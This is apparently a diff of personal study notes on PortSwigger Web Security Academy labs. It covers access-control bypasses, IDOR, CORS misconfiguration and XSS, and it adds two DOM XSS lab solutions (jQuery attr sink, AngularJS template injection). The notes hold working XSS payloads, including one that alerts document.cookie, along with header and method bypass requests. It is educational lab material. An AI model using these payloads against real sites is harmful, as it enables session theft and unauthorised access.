@@ -23,10 +23,10 @@
 ### Parameter-based access control methods: hidden field, cookie, preset query string
 
 ```
-[Lab]: Unprotected admin functionality: robots.txt
-[Lab]: Unprotected admin functionality with unpredictable URL: view source => js to check admin => /admin-uhsegl
-[Lab]: User role controlled by request paramter: login as wiener/peter => go to /admin
-[Lab]: User role can be modified in user profile: 
+Lab: Unprotected admin functionality: robots.txt
+Lab: Unprotected admin functionality with unpredictable URL: view source => js to check admin => /admin-uhsegl
+Lab: User role controlled by request paramter: login as wiener/peter => go to /admin
+Lab: User role can be modified in user profile: 
 ```
 
 ### Platform misconfiguration:
@@ -34,14 +34,14 @@
 - Restricting certain HTTP methods
 - *Custom http headers to override restricted urls*
 
-#### [Lab]: URL-based access control can be circumvented
+#### Lab: URL-based access control can be circumvented
 ```
 POST / HTTP/1.1
 Cookie: session=FQxqrQ8PJHEBARHT7se4bxv6sqHGrQJD
 X-Original-URL: /admin
 ```
 
-#### [Lab]: Method-based access control can be circumvented
+#### Lab: Method-based access control can be circumvented
 ```
 Login as wiener/peter:
 PUT /admin-roles HTTP/1.1
@@ -50,7 +50,7 @@ username=wiener&action=upgrade
 ```
 
 ### Horizontal Privilege Escalation
-#### [Lab]: User ID controlled by request parameter
+#### Lab: User ID controlled by request parameter
 ```
 Login as wiener/peter:
 /my-account?id=carlos
@@ -58,14 +58,14 @@ Login as wiener/peter:
 Copy and submit the API key
 ```
 
-#### [Lab]: User ID controlled by request parameter, with unpredictable user IDs 
+#### Lab: User ID controlled by request parameter, with unpredictable user IDs 
 ```
 Login as wiener/peter:
 Go to /post?postId=3, to find carlos' userId.
 User that userId to get API key from My Account page.
 ```
 
-#### [Lab]: User ID controlled by request parameter with data leakage in redirect
+#### Lab: User ID controlled by request parameter with data leakage in redirect
 ```
 Login as wiener/peter
 Go to /my-account?id=carlos => it redirects back to home page
@@ -75,7 +75,7 @@ Before redirection, the API key for carlos is leaked.
 
 ### Horizontal to vertical privilege escalation
 
-#### [Lab]: User ID controlled by request parameter with password disclosure
+#### Lab: User ID controlled by request parameter with password disclosure
 
 ```
 Login as wiener/peter
@@ -95,7 +95,7 @@ IDOR vulnerabilities often arise when sensitive resources are located in static 
 
 ``` https://insecure-website.com/static/12144.txt```
 
-#### [Lab]: Insecure Direct Object References
+#### Lab: Insecure Direct Object References
 ```
 Login as wiener/peter
 Go to /chat and Download Transcript
@@ -107,7 +107,7 @@ Login to carlos' account
 
 ### Access control vulnerabilities in multi-step processes
 
-#### [Lab]: Multi-step process with no access control on one step
+#### Lab: Multi-step process with no access control on one step
 
 ```
 
@@ -122,7 +122,7 @@ Repeat the request while logged in as wiener
 
 ### Referer-based access control
 
-#### [Lab]: Referer-based access control
+#### Lab: Referer-based access control
 
 ```
 Login as administrator/admin
@@ -200,7 +200,7 @@ Access-Control-Allow-Credentials: true
 ...
 ```
 
-#### [Lab]: CORS vulnerability with basic origin reflection
+#### Lab: CORS vulnerability with basic origin reflection
 
 1. Login as wiener/peter
 2. Go to /my-account
@@ -255,7 +255,7 @@ Submit exploit to victim and go to /log:
 	- Sandboxed cross-origin requests.
 - Sandboxed iframe cross-origin request:
 
-#### [Lab]: CORS vulnerability with trusted null origin
+#### Lab: CORS vulnerability with trusted null origin
 
 Send this to the victim.
 
@@ -314,7 +314,7 @@ You could chain CORS and XSS as follows
 6. The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
 7. The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
 
-#### [Lab]: CORS vulnerability with trusted insecure protocols
+#### Lab: CORS vulnerability with trusted insecure protocols
 
 ```
 <script>
@@ -336,7 +336,7 @@ function reqListener() {
 - There is one common situation where an attacker can't access a website directly.
 - Internal websites are often held to a lower security standard than external sites.
 
-#### [Lab]: CORS vulnerability with internal network pivot attack
+#### Lab: CORS vulnerability with internal network pivot attack
 
 ```TBD```
 
@@ -365,11 +365,11 @@ How to:
 - Test alternative payloads: based on context of reflection and input validation.
 - Test the attack in a browser.
 
-#### [Lab]: Reflected XSS into HTML context with nothing encoded
+#### Lab: Reflected XSS into HTML context with nothing encoded
 
 Search bar ```<img src=x onerror=alert(1)>```
 
-#### [Lab]: Reflected XSS into HTML context with most tags and attributes blocked
+#### Lab: Reflected XSS into HTML context with most tags and attributes blocked
 
 ```<h1>0 search results for 'asdf'</h1>```
 
@@ -410,7 +410,7 @@ How to:
 	- Test if value appears in immediate response
 	- If it does, test if it appears in consequent responses
 
-#### [Lab]: Stored XSS into HTML context with nothing encoded
+#### Lab: Stored XSS into HTML context with nothing encoded
 
 Comment ```<img src=x onerror=alert(1)>```
 
@@ -441,7 +441,7 @@ Includes unsafe data into the DOM.
 - For each source (like ```location```) find cases in JS code where it is referenced.
 - Find it in the developer tools ```Ctrl-Shift-F``` and add a breakpoint to see how the value is used.
 
-#### [Lab]: DOM XSS in document.write sink using source location.search
+#### Lab: DOM XSS in document.write sink using source location.search
 
 The sink and source are in embedded javascript within the search page.
 
@@ -465,7 +465,7 @@ Intended solution ```"><svg onload=alert(1)>```
 
 ----
 
-#### [Lab]: DOM XSS in document.write sink using source location.search inside a select element
+#### Lab: DOM XSS in document.write sink using source location.search inside a select element
 
 Relevant code
 
@@ -508,7 +508,7 @@ Intended solution ```"></select><img src=1 onerror=alert(1)>```
 
 ```element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'```
 
-#### [Lab]: DOM XSS in innerHTML sink using source location.search
+#### Lab: DOM XSS in innerHTML sink using source location.search
 
 Relevant code
 
@@ -528,10 +528,51 @@ Does work ```<img src=1 onerror=alert(1)>```
 
 ----
 
+jQuery ```attr()``` used to change attributes, can act as a sink.
+
+#### Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
+
+> This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.
+
+>To solve this lab, make the "back" link alert document.cookie. 
 
 
+Relevant code
 
+```
+<script>
+$(function() {
+	$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+});
+</script>
+```
 
+Putting ```/feedback?returnPath=javascript:alert(1)``` pops alert on clicking the link, but we need a 0-click payload.
 
+Doesn't work ```/feedback?returnPath="><img src=x onerror=alert(1)><a href="```
 
+Works ```/feedback?returnPath=javascript:onload=alert(document.cookie)```
+
+----
+
+- ```ng-app``` attribute is processed by AngularJS.
+- Anything within ```{{}}``` will be executed.
+
+#### Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+
+[link](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)
+
+> This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.
+
+> AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.
+
+> To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function.
+
+Using Wappalyzer, I found out that the AngularJS version is 1.7.7 and from the below blog post by Gareth Heyes I found out the corresponding payload in Angular >= 1.6.0 which has removed the sandbox.
+
+[tutorial](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs)
+
+```{{constructor.constructor('alert(1)')()}}```
+
+----
 
